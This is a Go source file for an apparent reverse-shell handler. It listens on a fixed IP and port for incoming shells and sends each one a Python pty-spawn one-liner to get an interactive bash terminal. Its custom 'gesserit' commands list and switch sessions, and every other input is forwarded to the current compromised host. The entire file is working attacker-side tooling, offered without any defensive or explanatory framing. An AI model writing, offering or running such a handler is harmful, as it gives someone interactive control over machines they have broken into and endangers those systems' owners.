package main

import (
	"fmt"
	"net"
	"os"
	"bufio"
)

const (
	HOST = "192.168.172.1"
	PORT = "4242"
	TYPE = "tcp"
)

type session struct {
	connection net.Conn
	sid int
	channel chan string
}

func receiveData(conn net.Conn) string {
	msg := make([]byte, 2048)
	_, err := conn.Read(msg[0:])
	if err != nil {
		fmt.Println("Error receiving data", err.Error())
	}
	return string(msg)
}

func sendData(conn net.Conn, data string) {
	_, err := conn.Write([]byte(data))
	if err != nil {
		fmt.Println("Error sending data", err.Error())
	}
}

func handleConnection(s session){
	status := "pause"
	fmt.Println("Attempting to spawn tty shell")
	tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
	sendData(s.connection, tty_spawn)
	for{
		select{
		case state := <- s.channel:
			switch state{
			case "pause":
				fmt.Println(s.sid, "PAUSED")
				status = "pause"
			default:
				status = "play"
			}
		default:
			if status == "play" {
				fmt.Print(receiveData(s.connection))
			}
		}
	}
}

func listen(sessions *[]session){
	l, err := net.Listen(TYPE, HOST + ":" + PORT)
	if err != nil {
		fmt.Println("Error trying to listen", err.Error())
		os.Exit(1)
	}
	fmt.Println("Listening")
	i := 0
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error trying to accept", err.Error())
			os.Exit(1)
		}
		fmt.Println("New Session from " + conn.RemoteAddr().String())
		s:= session{conn, i, make(chan string, 6)}
		s.channel <- "play"
		*sessions = append(*sessions, s)

		go handleConnection(s)
		i++
		defer conn.Close()
		defer l.Close()
	}
}

func main(){
	sessions := make([]session, 0)
	go listen(&sessions)

	currentSession := 0
	for{
		reader := bufio.NewReader(os.Stdin)
		cmd, _ := reader.ReadString('\n')
		switch cmd{
		case "gesserit switch\n":
			fmt.Println("change session to?")
			var newS int
			fmt.Scanln(&newS)
			currentSession = newS
			for i:= 0; i < len(sessions); i++ {
				if sessions[i].sid != currentSession {
					sessions[i].channel <- "pause"
				}
			}
			sessions[currentSession].channel <- "play"

			//sessions[currentSession].channel <- 0
		case "gesserit list\n":
			for i:= 0; i < len(sessions); i++ {
				if i == currentSession {
					fmt.Println("*", sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
				}else{
					fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
				}
			}
		default:
			sendData(sessions[currentSession].connection, cmd)
		}

	}

}
